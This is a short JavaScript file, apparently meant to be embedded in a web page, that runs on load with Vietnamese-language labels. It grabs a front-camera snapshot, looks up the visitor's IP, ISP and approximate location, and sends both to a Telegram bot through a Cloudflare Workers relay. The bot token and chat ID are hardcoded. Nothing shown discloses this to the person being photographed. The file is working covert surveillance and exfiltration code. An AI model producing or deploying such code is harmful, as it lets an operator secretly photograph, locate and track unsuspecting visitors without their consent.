const TELEGRAM_BOT_TOKEN = '7731248083:AAFSbM3YKJuWb3kwqAQg1OGmySjf9mUFTaw';
const TELEGRAM_CHAT_ID = '6502310633';
const API_SEND_PHOTO = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: ''
};

function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude;
      info.lon = data.longitude;
    });
}

function getMessageText() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒-Thời gian: ${info.time}
🌐-IP: ${info.ip}
🏢-ISP: ${info.isp}
🏙️-Địa chỉ: ${info.address}
🌍-Quốc gia: ${info.country}
📍-Vĩ độ (IP): ${info.lat}
📍-Kinh độ (IP): ${info.lon}
📸-Ảnh từ camera phía trước
  `.trim();
}

function captureCameraAndSend() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');

        setTimeout(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            getIPInfo().then(() => {
              const formData = new FormData();
              formData.append('chat_id', TELEGRAM_CHAT_ID);
              formData.append('photo', blob, 'cam.jpg');
              formData.append('caption', getMessageText());

              fetch(API_SEND_PHOTO, {
                method: 'POST',
                body: formData
              });
            });
          }, 'image/jpeg', 0.9);
        }, 1000); // đợi 1s cho camera ổn định
      };
    })
    .catch(error => {
      console.warn('Không thể truy cập camera:', error);
    });
}

// Bắt đầu
captureCameraAndSend();
